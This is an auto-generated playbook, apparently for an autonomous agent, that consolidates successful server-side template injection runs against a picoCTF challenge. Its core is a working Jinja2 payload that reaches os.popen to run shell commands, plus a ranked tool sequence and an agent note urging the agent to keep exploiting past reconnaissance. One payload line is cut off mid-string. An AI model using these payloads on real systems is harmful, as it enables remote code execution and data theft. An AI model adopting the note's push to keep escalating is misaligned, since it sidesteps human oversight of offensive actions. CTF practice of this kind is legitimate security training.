# Consolidated Lessons: Server-Side Template Injection (Jinja2/Twig)

> **Auto-generated:** 2026-03-03 08:30:36 UTC
> **Category:** Server-Side Template Injection
> **Type:** consolidated_lessons (2 docs — 2 success, 0 failure)
> **Tags:** `consolidated, server_side_template_injection, lessons, high-priority, wisdom`

> **Agent Note:** This consolidates patterns from multiple runs on this category.
> Use the Quick Exploitation Path as your primary action guide.

---

## Coverage

- **Total atomic rule docs:** 2
- **Success runs:** 2
- **Failure/partial runs:** 0

## Best Exploitation Path (from most recent success)

1. **`http_fetch`**: Fetch the target URL to map the application and identify input forms
2. **`javascript_source`**: Inspect JS for injection points, credentials, or API endpoints
3. **`form_submit`**: Submit a payload via the identified form or API endpoint — use: `{"url":"http://rescued-float.picoctf.net:63434/announce","method":"POST","data":{"content":"{{config.__class__.__init__.__globals__['os'].popen('cat /challenge/flag').read()}}"},"max_body":0}`
4. **`ssti_exploit_suggester`**: Get escalation payloads for the detected template engine — use: `{"engine":"jinja2","command":"cat /flag.t

## Key Takeaways (ranked by frequency across runs)

1. Follow this winning tool sequence: http_fetch → javascript_source → form_submit → ssti_exploit_suggester
2. Continue exploitation after confirming 'ssti_confirmed' — do not stop at reconnaissance

## Confirmed Winning Inputs

These exact requests produced the flag:

- `ssti_exploit_suggester` input: {"engine":"jinja2","command":"cat /flag.txt"}
- `form_submit` input: {"url":"http://rescued-float.picoctf.net:63434/announce","method":"POST","data":{"content":"{{config.__class__.__init__.__globals__['os'].popen('cat /challenge/flag').read()}}"},"max_body":0}
